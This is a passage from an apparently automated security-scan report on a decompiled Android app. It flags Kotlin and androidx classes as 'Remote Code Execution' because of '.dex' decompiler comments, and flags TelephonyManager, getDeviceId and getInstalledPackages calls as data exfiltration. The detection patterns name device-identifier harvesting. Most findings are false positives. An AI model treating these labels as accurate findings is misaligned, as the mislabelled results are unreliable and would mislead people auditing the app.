    /* loaded from: classes5.dex */
    public final class b extends f4.l {

        /* renamed from: c, reason: collision with root package name */
```

**720. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/w3/h.java`
- **Line:** 14

```java
import kotlin.jvm.internal.Lambda;
import s3.q;

/* loaded from: classes25.dex */
public final class h extends Lambda implements Function0<List<? extends X509Certificate>> {

    /* renamed from: b, reason: collision with root package name */
```

**721. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/w3/d.java`
- **Line:** 10

```java
import w3.o;
import z3.v;

/* loaded from: classes23.dex */
public final class d {

    /* renamed from: a, reason: collision with root package name */
```

**722. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/w3/p.java`
- **Line:** 11

```java
import kotlin.jvm.internal.Lambda;
import s3.s;

/* loaded from: classes4.dex */
public final class p extends Lambda implements Function0<List<? extends Proxy>> {

    /* renamed from: b, reason: collision with root package name */
```

**723. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/w3/e.java`
- **Line:** 21

```java
import s3.w;
import s3.y;

/* loaded from: classes7.dex */
public final class e implements s3.d {

    /* renamed from: b, reason: collision with root package name */
```

**724. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/w3/e.java`
- **Line:** 78

```java
    /* renamed from: s, reason: collision with root package name */
    public final boolean f5845s;

    /* loaded from: classes5.dex */
    public final class a implements Runnable {

        /* renamed from: b, reason: collision with root package name */
```

**725. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/w3/e.java`
- **Line:** 158

```java
        }
    }

    /* loaded from: classes20.dex */
    public static final class b extends WeakReference<e> {

        /* renamed from: a, reason: collision with root package name */
```

**726. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/w3/e.java`
- **Line:** 172

```java
        }
    }

    /* loaded from: classes13.dex */
    public static final class c extends f4.c {
        public c() {
        }
```

**727. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/w3/i.java`
- **Line:** 5

```java

import e4.d;

/* loaded from: classes22.dex */
public final class i extends d.c {

    /* renamed from: e, reason: collision with root package name */
```

**728. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/w3/j.java`
- **Line:** 43

```java
import z3.f;
import z3.r;

/* loaded from: classes2.dex */
public final class j extends f.d implements s3.i {

    /* renamed from: b, reason: collision with root package name */
```

**729. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/w3/f.java`
- **Line:** 5

```java

import java.net.Proxy;

/* loaded from: classes25.dex */
public final /* synthetic */ class f {

    /* renamed from: a, reason: collision with root package name */
```

**730. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/w3/g.java`
- **Line:** 10

```java
import kotlin.jvm.internal.Lambda;
import s3.q;

/* loaded from: classes12.dex */
public final class g extends Lambda implements Function0<List<? extends Certificate>> {

    /* renamed from: b, reason: collision with root package name */
```

**731. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/w3/k.java`
- **Line:** 8

```java
import kotlin.Unit;
import kotlin.jvm.internal.Intrinsics;

/* loaded from: classes12.dex */
public final class k extends v3.a {

    /* renamed from: e, reason: collision with root package name */
```

**732. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/w3/l.java`
- **Line:** 14

```java
import s3.e0;
import w3.e;

/* loaded from: classes23.dex */
public final class l {

    /* renamed from: a, reason: collision with root package name */
```

**733. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/w3/m.java`
- **Line:** 7

```java
import java.util.Set;
import s3.e0;

/* loaded from: classes22.dex */
public final class m {

    /* renamed from: a, reason: collision with root package name */
```

**734. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/w3/a.java`
- **Line:** 11

```java
import s3.t;
import s3.w;

/* loaded from: classes15.dex */
public final class a implements t {

    /* renamed from: a, reason: collision with root package name */
```

**735. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/kotlin/KotlinNullPointerException.java`
- **Line:** 3

```java
package kotlin;

/* loaded from: classes17.dex */
public class KotlinNullPointerException extends NullPointerException {
    public KotlinNullPointerException() {
    }
```

**736. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/kotlin/UIntKt.java`
- **Line:** 5

```java

import kotlin.internal.InlineOnly;

/* loaded from: classes23.dex */
public final class UIntKt {
    @SinceKotlin(version = "1.5")
    @WasExperimental(markerClass = {ExperimentalUnsignedTypes.class})
```

**737. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/kotlin/NumbersKt.java`
- **Line:** 3

```java
package kotlin;

/* loaded from: classes19.dex */
public final class NumbersKt extends NumbersKt__NumbersKt {
    private NumbersKt() {
    }
```

**738. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/kotlin/PropertyReferenceDelegatesKt.java`
- **Line:** 11

```java
import kotlin.reflect.KProperty0;
import kotlin.reflect.KProperty1;

/* loaded from: classes11.dex */
public final class PropertyReferenceDelegatesKt {
    @SinceKotlin(version = "1.4")
    @InlineOnly
```

**739. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/kotlin/LazyKt__LazyJVMKt.java`
- **Line:** 8

```java
import kotlin.jvm.internal.Intrinsics;

/* JADX INFO: Access modifiers changed from: package-private */
/* loaded from: classes17.dex */
public class LazyKt__LazyJVMKt {

    /* loaded from: classes20.dex */
```

**740. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/kotlin/LazyKt__LazyJVMKt.java`
- **Line:** 11

```java
/* loaded from: classes17.dex */
public class LazyKt__LazyJVMKt {

    /* loaded from: classes20.dex */
    public /* synthetic */ class WhenMappings {
        public static final /* synthetic */ int[] $EnumSwitchMapping$0;

```

**741. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/kotlin/NumbersKt__BigIntegersKt.java`
- **Line:** 9

```java
import kotlin.internal.InlineOnly;
import kotlin.jvm.internal.Intrinsics;

/* loaded from: classes24.dex */
class NumbersKt__BigIntegersKt extends NumbersKt__BigDecimalsKt {
    @SinceKotlin(version = "1.2")
    @InlineOnly
```

**742. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/kotlin/UShortArray.java`
- **Line:** 16

```java
@SinceKotlin(version = "1.3")
@ExperimentalUnsignedTypes
@JvmInline
/* loaded from: classes2.dex */
public final class UShortArray implements Collection<UShort>, KMappedMarker {
    private final short[] storage;

```

**743. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/kotlin/UShortArray.java`
- **Line:** 20

```java
public final class UShortArray implements Collection<UShort>, KMappedMarker {
    private final short[] storage;

    /* loaded from: classes5.dex */
    public static final class Iterator implements java.util.Iterator<UShort>, KMappedMarker {
        private final short[] array;
        private int index;
```

**744. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/kotlin/StandardKt__StandardKt.java`
- **Line:** 9

```java
import kotlin.jvm.functions.Function1;
import kotlin.jvm.internal.Intrinsics;

/* loaded from: classes25.dex */
class StandardKt__StandardKt {
    /* JADX WARN: Multi-variable type inference failed */
    @InlineOnly
```

**745. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/kotlin/SynchronizedLazyImpl.java`
- **Line:** 8

```java
import kotlin.jvm.internal.DefaultConstructorMarker;
import kotlin.jvm.internal.Intrinsics;

/* loaded from: classes16.dex */
final class SynchronizedLazyImpl<T> implements Lazy<T>, Serializable {
    private volatile Object _value;
    private Function0<? extends T> initializer;
```

**746. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/kotlin/ReplaceWith.java`
- **Line:** 16

```java
@Documented
@Retention(RetentionPolicy.CLASS)
@kotlin.annotation.Retention(AnnotationRetention.BINARY)
/* loaded from: classes12.dex */
public @interface ReplaceWith {
    String expression();

```

**747. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/kotlin/KotlinVersionCurrentValue.java`
- **Line:** 5

```java

import kotlin.jvm.JvmStatic;

/* loaded from: classes18.dex */
final class KotlinVersionCurrentValue {
    public static final KotlinVersionCurrentValue INSTANCE = new KotlinVersionCurrentValue();

```

**748. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/kotlin/DeepRecursiveScopeImpl.java`
- **Line:** 13

```java
import kotlin.jvm.internal.Intrinsics;
import kotlin.jvm.internal.TypeIntrinsics;

/* loaded from: classes20.dex */
final class DeepRecursiveScopeImpl<T, R> extends DeepRecursiveScope<T, R> implements Continuation<R> {
    private Continuation<Object> cont;
    private Function3<? super DeepRecursiveScope<?, ?>, Object, ? super Continuation<Object>, ? extends Object> function;
```

**749. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/kotlin/SuspendKt.java`
- **Line:** 8

```java
import kotlin.jvm.functions.Function1;
import kotlin.jvm.internal.Intrinsics;

/* loaded from: classes17.dex */
public final class SuspendKt {
    /* JADX WARN: Multi-variable type inference failed */
    @SinceKotlin(version = "1.2")
```

**750. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/kotlin/Unit.java`
- **Line:** 3

```java
package kotlin;

/* loaded from: classes14.dex */
public final class Unit {
    public static final Unit INSTANCE = new Unit();

```

**751. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/kotlin/PreconditionsKt__AssertionsJVMKt.java`
- **Line:** 7

```java
import kotlin.jvm.functions.Function0;
import kotlin.jvm.internal.Intrinsics;

/* loaded from: classes14.dex */
class PreconditionsKt__AssertionsJVMKt {
    @InlineOnly
    /* renamed from: assert, reason: not valid java name */
```

**752. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/kotlin/Pair.java`
- **Line:** 6

```java
import java.io.Serializable;
import kotlin.jvm.internal.Intrinsics;

/* loaded from: classes15.dex */
public final class Pair<A, B> implements Serializable {
    private final A first;
    private final B second;
```

**753. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/kotlin/UByteKt.java`
- **Line:** 5

```java

import kotlin.internal.InlineOnly;

/* loaded from: classes6.dex */
public final class UByteKt {
    @SinceKotlin(version = "1.5")
    @WasExperimental(markerClass = {ExperimentalUnsignedTypes.class})
```

**754. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/kotlin/NumbersKt__NumbersKt.java`
- **Line:** 5

```java

import kotlin.internal.InlineOnly;

/* loaded from: classes4.dex */
class NumbersKt__NumbersKt extends NumbersKt__NumbersJVMKt {
    @SinceKotlin(version = "1.4")
    @WasExperimental(markerClass = {ExperimentalStdlibApi.class})
```

**755. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/kotlin/UnsafeLazyImpl.java`
- **Line:** 7

```java
import kotlin.jvm.functions.Function0;
import kotlin.jvm.internal.Intrinsics;

/* loaded from: classes6.dex */
public final class UnsafeLazyImpl<T> implements Lazy<T>, Serializable {
    private Object _value;
    private Function0<? extends T> initializer;
```

**756. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/kotlin/PublishedApi.java`
- **Line:** 19

```java
@kotlin.annotation.Retention(AnnotationRetention.BINARY)
@MustBeDocumented
@Documented
/* loaded from: classes19.dex */
public @interface PublishedApi {
}

```

**757. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/kotlin/InitializedLazyImpl.java`
- **Line:** 5

```java

import java.io.Serializable;

/* loaded from: classes17.dex */
public final class InitializedLazyImpl<T> implements Lazy<T>, Serializable {
    private final T value;

```

**758. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/kotlin/UIntArray.java`
- **Line:** 16

```java
@SinceKotlin(version = "1.3")
@ExperimentalUnsignedTypes
@JvmInline
/* loaded from: classes12.dex */
public final class UIntArray implements Collection<UInt>, KMappedMarker {
    private final int[] storage;

```

**759. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/kotlin/UIntArray.java`
- **Line:** 20

```java
public final class UIntArray implements Collection<UInt>, KMappedMarker {
    private final int[] storage;

    /* loaded from: classes20.dex */
    public static final class Iterator implements java.util.Iterator<UInt>, KMappedMarker {
        private final int[] array;
        private int index;
```

**760. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/kotlin/UByteArray.java`
- **Line:** 16

```java
@SinceKotlin(version = "1.3")
@ExperimentalUnsignedTypes
@JvmInline
/* loaded from: classes21.dex */
public final class UByteArray implements Collection<UByte>, KMappedMarker {
    private final byte[] storage;

```

**761. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/kotlin/UByteArray.java`
- **Line:** 20

```java
public final class UByteArray implements Collection<UByte>, KMappedMarker {
    private final byte[] storage;

    /* loaded from: classes5.dex */
    public static final class Iterator implements java.util.Iterator<UByte>, KMappedMarker {
        private final byte[] array;
        private int index;
```

**762. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/kotlin/CharCodeJVMKt.java`
- **Line:** 5

```java

import kotlin.internal.InlineOnly;

/* loaded from: classes22.dex */
public final class CharCodeJVMKt {
    @SinceKotlin(version = "1.5")
    @WasExperimental(markerClass = {ExperimentalStdlibApi.class})
```

**763. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/kotlin/LateinitKt.java`
- **Line:** 10

```java
import kotlin.reflect.KProperty0;

@JvmName(name = "LateinitKt")
/* loaded from: classes11.dex */
public final class LateinitKt {
    private static final boolean isInitialized(@AccessibleLateinitPropertyLiteral KProperty0<?> kProperty0) {
        Intrinsics.checkNotNullParameter(kProperty0, "<this>");
```

**764. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/kotlin/ExtensionFunctionType.java`
- **Line:** 15

```java
@kotlin.annotation.Target(allowedTargets = {AnnotationTarget.TYPE})
@Documented
@Retention(RetentionPolicy.RUNTIME)
/* loaded from: classes18.dex */
public @interface ExtensionFunctionType {
}

```

**765. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/kotlin/ContextFunctionTypeParams.java`
- **Line:** 15

```java
@kotlin.annotation.Target(allowedTargets = {AnnotationTarget.TYPE})
@Documented
@Retention(RetentionPolicy.RUNTIME)
/* loaded from: classes17.dex */
public @interface ContextFunctionTypeParams {
    int count();
}
```

**766. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/kotlin/OptIn.java`
- **Line:** 16

```java
@kotlin.annotation.Target(allowedTargets = {AnnotationTarget.CLASS, AnnotationTarget.PROPERTY, AnnotationTarget.LOCAL_VARIABLE, AnnotationTarget.VALUE_PARAMETER, AnnotationTarget.CONSTRUCTOR, AnnotationTarget.FUNCTION, AnnotationTarget.PROPERTY_GETTER, AnnotationTarget.PROPERTY_SETTER, AnnotationTarget.EXPRESSION, AnnotationTarget.FILE, AnnotationTarget.TYPEALIAS})
@Retention(RetentionPolicy.SOURCE)
@kotlin.annotation.Retention(AnnotationRetention.SOURCE)
/* loaded from: classes21.dex */
public @interface OptIn {
    Class<? extends Annotation>[] markerClass();
}
```

**767. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/kotlin/LazyKt.java`
- **Line:** 3

```java
package kotlin;

/* loaded from: classes13.dex */
public final class LazyKt extends LazyKt__LazyKt {
    private LazyKt() {
    }
```

**768. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/kotlin/ResultKt.java`
- **Line:** 9

```java
import kotlin.jvm.functions.Function1;
import kotlin.jvm.internal.Intrinsics;

/* loaded from: classes5.dex */
public final class ResultKt {
    @SinceKotlin(version = "1.3")
    @PublishedApi
```

**769. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/kotlin/UseExperimental.java`
- **Line:** 18

```java
@Retention(RetentionPolicy.SOURCE)
@kotlin.annotation.Retention(AnnotationRetention.SOURCE)
@DeprecatedSinceKotlin(errorSince = "1.6", warningSince = "1.4")
/* loaded from: classes12.dex */
public @interface UseExperimental {
    Class<? extends Annotation>[] markerClass();
}
```

**770. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/kotlin/NumbersKt__NumbersJVMKt.java`
- **Line:** 8

```java
import kotlin.jvm.internal.FloatCompanionObject;
import kotlin.jvm.internal.Intrinsics;

/* loaded from: classes8.dex */
class NumbersKt__NumbersJVMKt extends NumbersKt__FloorDivModKt {
    @SinceKotlin(version = "1.4")
    @WasExperimental(markerClass = {ExperimentalStdlibApi.class})
```

**771. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/kotlin/ExperimentalMultiplatform.java`
- **Line:** 19

```java
@kotlin.annotation.Retention(AnnotationRetention.BINARY)
@MustBeDocumented
@Documented
/* loaded from: classes25.dex */
public @interface ExperimentalMultiplatform {
}

```

**772. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/kotlin/Deprecated.java`
- **Line:** 16

```java
@kotlin.annotation.Target(allowedTargets = {AnnotationTarget.CLASS, AnnotationTarget.FUNCTION, AnnotationTarget.PROPERTY, AnnotationTarget.ANNOTATION_CLASS, AnnotationTarget.CONSTRUCTOR, AnnotationTarget.PROPERTY_SETTER, AnnotationTarget.PROPERTY_GETTER, AnnotationTarget.TYPEALIAS})
@Documented
@Retention(RetentionPolicy.RUNTIME)
/* loaded from: classes15.dex */
public @interface Deprecated {
    DeprecationLevel level() default DeprecationLevel.WARNING;

```

**773. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/kotlin/DslMarker.java`
- **Line:** 19

```java
@kotlin.annotation.Retention(AnnotationRetention.BINARY)
@MustBeDocumented
@Documented
/* loaded from: classes19.dex */
public @interface DslMarker {
}

```

**774. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/kotlin/CompareToKt.java`
- **Line:** 6

```java
import kotlin.internal.InlineOnly;
import kotlin.jvm.internal.Intrinsics;

/* loaded from: classes3.dex */
public final class CompareToKt {
    /* JADX WARN: Multi-variable type inference failed */
    @SinceKotlin(version = "1.6")
```

**775. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/kotlin/NoWhenBranchMatchedException.java`
- **Line:** 3

```java
package kotlin;

/* loaded from: classes21.dex */
public class NoWhenBranchMatchedException extends RuntimeException {
    public NoWhenBranchMatchedException() {
    }
```

**776. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/kotlin/DeepRecursiveFunction.java`
- **Line:** 9

```java

@SinceKotlin(version = "1.7")
@WasExperimental(markerClass = {ExperimentalStdlibApi.class})
/* loaded from: classes10.dex */
public final class DeepRecursiveFunction<T, R> {
    private final Function3<DeepRecursiveScope<T, R>, T, Continuation<? super R>, Object> block;

```

**777. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/kotlin/SinceKotlin.java`
- **Line:** 18

```java
@Documented
@Retention(RetentionPolicy.CLASS)
@kotlin.annotation.Retention(AnnotationRetention.BINARY)
/* loaded from: classes9.dex */
public @interface SinceKotlin {
    String version();
}
```

**778. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/kotlin/LazyThreadSafetyMode.java`
- **Line:** 3

```java
package kotlin;

/* loaded from: classes10.dex */
public enum LazyThreadSafetyMode {
    SYNCHRONIZED,
    PUBLICATION,
```

**779. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/kotlin/OverloadResolutionByLambdaReturnType.java`
- **Line:** 17

```java
@kotlin.annotation.Target(allowedTargets = {AnnotationTarget.FUNCTION})
@Retention(RetentionPolicy.CLASS)
@kotlin.annotation.Retention(AnnotationRetention.BINARY)
/* loaded from: classes2.dex */
public @interface OverloadResolutionByLambdaReturnType {
}

```

**780. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/kotlin/UnsignedKt.java`
- **Line:** 8

```java
import kotlin.text.CharsKt;

@JvmName(name = "UnsignedKt")
/* loaded from: classes13.dex */
public final class UnsignedKt {
    @PublishedApi
    public static final int doubleToUInt(double d5) {
```

**781. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/kotlin/UInt.java`
- **Line:** 12

```java
@SinceKotlin(version = "1.5")
@JvmInline
@WasExperimental(markerClass = {ExperimentalUnsignedTypes.class})
/* loaded from: classes2.dex */
public final class UInt implements Comparable<UInt> {
    public static final Companion Companion = new Companion(null);
    public static final int MAX_VALUE = -1;
```

**782. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/kotlin/UInt.java`
- **Line:** 21

```java
    public static final int SIZE_BYTES = 4;
    private final int data;

    /* loaded from: classes13.dex */
    public static final class Companion {
        private Companion() {
        }
```

**783. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/kotlin/OptionalExpectation.java`
- **Line:** 15

```java
@kotlin.annotation.Target(allowedTargets = {AnnotationTarget.ANNOTATION_CLASS})
@Retention(RetentionPolicy.CLASS)
@kotlin.annotation.Retention(AnnotationRetention.BINARY)
/* loaded from: classes5.dex */
public @interface OptionalExpectation {
}

```

**784. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/kotlin/UShortArrayKt.java`
- **Line:** 7

```java
import kotlin.jvm.functions.Function1;
import kotlin.jvm.internal.Intrinsics;

/* loaded from: classes20.dex */
public final class UShortArrayKt {
    @SinceKotlin(version = "1.3")
    @ExperimentalUnsignedTypes
```

**785. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/kotlin/PreconditionsKt__PreconditionsKt.java`
- **Line:** 7

```java
import kotlin.jvm.functions.Function0;
import kotlin.jvm.internal.Intrinsics;

/* loaded from: classes24.dex */
class PreconditionsKt__PreconditionsKt extends PreconditionsKt__AssertionsJVMKt {
    @InlineOnly
    private static final void check(boolean z4) {
```

**786. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/kotlin/UninitializedPropertyAccessException.java`
- **Line:** 3

```java
package kotlin;

/* loaded from: classes12.dex */
public final class UninitializedPropertyAccessException extends RuntimeException {
    public UninitializedPropertyAccessException() {
    }
```

**787. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/kotlin/NotImplementedError.java`
- **Line:** 6

```java
import kotlin.jvm.internal.DefaultConstructorMarker;
import kotlin.jvm.internal.Intrinsics;

/* loaded from: classes8.dex */
public final class NotImplementedError extends Error {
    /* JADX WARN: Multi-variable type inference failed */
    public NotImplementedError() {
```

**788. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/kotlin/BuilderInference.java`
- **Line:** 17

```java
@kotlin.annotation.Target(allowedTargets = {AnnotationTarget.VALUE_PARAMETER, AnnotationTarget.FUNCTION, AnnotationTarget.PROPERTY})
@Retention(RetentionPolicy.CLASS)
@kotlin.annotation.Retention(AnnotationRetention.BINARY)
/* loaded from: classes10.dex */
public @interface BuilderInference {
}

```

**789. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/kotlin/LazyKt__LazyKt.java`
- **Line:** 7

```java
import kotlin.jvm.internal.Intrinsics;
import kotlin.reflect.KProperty;

/* loaded from: classes19.dex */
class LazyKt__LazyKt extends LazyKt__LazyJVMKt {
    @InlineOnly
    private static final <T> T getValue(Lazy<? extends T> lazy, Object obj, KProperty<?> property) {
```

**790. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/kotlin/PreconditionsKt.java`
- **Line:** 3

```java
package kotlin;

/* loaded from: classes10.dex */
public final class PreconditionsKt extends PreconditionsKt__PreconditionsKt {
    private PreconditionsKt() {
    }
```

**791. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/kotlin/UNumbersKt.java`
- **Line:** 7

```java
import kotlin.jvm.JvmName;

@JvmName(name = "UNumbersKt")
/* loaded from: classes2.dex */
public final class UNumbersKt {
    @SinceKotlin(version = "1.5")
    @WasExperimental(markerClass = {ExperimentalUnsignedTypes.class, ExperimentalStdlibApi.class})
```


### Data Exfiltration (50 issues)

**1. Data Exfiltration Detected**
- **Description:** Suspicious pattern found: TelephonyManager
- **File:** `smali_classes20/androidx/core/telephony/TelephonyManagerCompat$Api23Impl.smali`
- **Line:** 1

```java
.class Landroidx/core/telephony/TelephonyManagerCompat$Api23Impl;
.super Ljava/lang/Object;

```

**2. Data Exfiltration Detected**
- **Description:** Suspicious pattern found: TelephonyManager
- **File:** `smali_classes20/androidx/core/telephony/TelephonyManagerCompat$Api23Impl.smali`
- **Line:** 11

```java

.annotation system Ldalvik/annotation/EnclosingClass;
    value = Landroidx/core/telephony/TelephonyManagerCompat;
.end annotation

```

**3. Data Exfiltration Detected**
- **Description:** Suspicious pattern found: TelephonyManager
- **File:** `smali_classes20/androidx/core/telephony/TelephonyManagerCompat$Api23Impl.smali`
- **Line:** 29

```java
.end method

.method public static getDeviceId(Landroid/telephony/TelephonyManager;I)Ljava/lang/String;
    .locals 0
    .annotation build Landroid/annotation/SuppressLint;
```

**4. Data Exfiltration Detected**
- **Description:** Suspicious pattern found: getDeviceId
- **File:** `smali_classes20/androidx/core/telephony/TelephonyManagerCompat$Api23Impl.smali`
- **Line:** 29

```java
.end method

.method public static getDeviceId(Landroid/telephony/TelephonyManager;I)Ljava/lang/String;
    .locals 0
    .annotation build Landroid/annotation/SuppressLint;
```

**5. Data Exfiltration Detected**
- **Description:** Suspicious pattern found: getDeviceId
- **File:** `smali_classes20/androidx/core/telephony/TelephonyManagerCompat$Api23Impl.smali`
- **Line:** 47

```java
    .end annotation

    invoke-virtual {p0, p1}, Landroid/telephony/TelephonyManager;->getDeviceId(I)Ljava/lang/String;

    move-result-object p0
```

**6. Data Exfiltration Detected**
- **Description:** Suspicious pattern found: getDeviceId
- **File:** `smali_classes11/androidx/appcompat/app/WindowDecorActionBar.smali`
- **Line:** 2032

```java
    if-eqz p2, :cond_1

    invoke-virtual {p2}, Landroid/view/KeyEvent;->getDeviceId()I

    move-result v2
```

**7. Data Exfiltration Detected**
- **Description:** Suspicious pattern found: getInstalledPackages
- **File:** `smali_classes16/com/blankj/utilcode/util/AppUtils.smali`
- **Line:** 1315

```java
    const/4 v2, 0x0

    invoke-virtual {v1, v2}, Landroid/content/pm/PackageManager;->getInstalledPackages(I)Ljava/util/List;

    move-result-object v2
```

**8. Data Exfiltration Detected**
- **Description:** Suspicious pattern found: TelephonyManager
- **File:** `smali_classes21/com/tencent/smtt/sdk/TbsDownloader.smali`
- **Line:** 197

```java
    move-result-object v0

    check-cast v0, Landroid/telephony/TelephonyManager;

    if-eqz v0, :cond_1
```

**9. Data Exfiltration Detected**
- **Description:** Suspicious pattern found: TelephonyManager
- **File:** `smali_classes9/androidx/core/content/ContextCompat$LegacyServiceMapHolder.smali`
- **Line:** 299

```java
    invoke-virtual {v0, v1, v2}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    const-class v1, Landroid/telephony/TelephonyManager;

    const-string v2, "phone"
```

**10. Data Exfiltration Detected**
- **Description:** Suspicious pattern found: TelephonyManager
- **File:** `smali_classes9/androidx/core/telephony/TelephonyManagerCompat$Api30Impl.smali`
- **Line:** 1

```java
.class Landroidx/core/telephony/TelephonyManagerCompat$Api30Impl;
.super Ljava/lang/Object;

```

**11. Data Exfiltration Detected**
- **Description:** Suspicious pattern found: TelephonyManager
- **File:** `smali_classes9/androidx/core/telephony/TelephonyManagerCompat$Api30Impl.smali`
- **Line:** 11

```java

.annotation system Ldalvik/annotation/EnclosingClass;
    value = Landroidx/core/telephony/TelephonyManagerCompat;
.end annotation

```

**12. Data Exfiltration Detected**
- **Description:** Suspicious pattern found: TelephonyManager
- **File:** `smali_classes9/androidx/core/telephony/TelephonyManagerCompat$Api30Impl.smali`
- **Line:** 29

```java
.end method

.method public static getSubscriptionId(Landroid/telephony/TelephonyManager;)I
    .locals 0
    .annotation build Landroidx/annotation/DoNotInline;
```

**13. Data Exfiltration Detected**
- **Description:** Suspicious pattern found: TelephonyManager
- **File:** `smali_classes24/com/blankj/utilcode/util/PhoneUtils.smali`
- **Line:** 86

```java

    :cond_0
    invoke-static {}, Lcom/blankj/utilcode/util/PhoneUtils;->getTelephonyManager()Landroid/telephony/TelephonyManager;

    move-result-object v2
```

**14. Data Exfiltration Detected**
- **Description:** Suspicious pattern found: TelephonyManager
- **File:** `smali_classes24/com/blankj/utilcode/util/PhoneUtils.smali`
- **Line:** 86

```java

    :cond_0
    invoke-static {}, Lcom/blankj/utilcode/util/PhoneUtils;->getTelephonyManager()Landroid/telephony/TelephonyManager;

    move-result-object v2
```

**15. Data Exfiltration Detected**
- **Description:** Suspicious pattern found: TelephonyManager
- **File:** `smali_classes24/com/blankj/utilcode/util/PhoneUtils.smali`
- **Line:** 90

```java
    move-result-object v2

    invoke-virtual {v2}, Landroid/telephony/TelephonyManager;->getDeviceId()Ljava/lang/String;

    move-result-object v3
```

**16. Data Exfiltration Detected**
- **Description:** Suspicious pattern found: getDeviceId
- **File:** `smali_classes24/com/blankj/utilcode/util/PhoneUtils.smali`
- **Line:** 63

```java
.end method

.method public static getDeviceId()Ljava/lang/String;
    .locals 5
    .annotation build Landroid/annotation/SuppressLint;
```

**17. Data Exfiltration Detected**
- **Description:** Suspicious pattern found: getDeviceId
- **File:** `smali_classes24/com/blankj/utilcode/util/PhoneUtils.smali`
- **Line:** 90

```java
    move-result-object v2

    invoke-virtual {v2}, Landroid/telephony/TelephonyManager;->getDeviceId()Ljava/lang/String;

    move-result-object v3
```

**18. Data Exfiltration Detected**
- **Description:** Suspicious pattern found: getDeviceId
- **File:** `smali_classes24/com/blankj/utilcode/util/PhoneUtils.smali`
- **Line:** 321

```java

    :cond_5
    invoke-virtual {v2}, Landroid/telephony/TelephonyManager;->getDeviceId()Ljava/lang/String;

    move-result-object v0
```

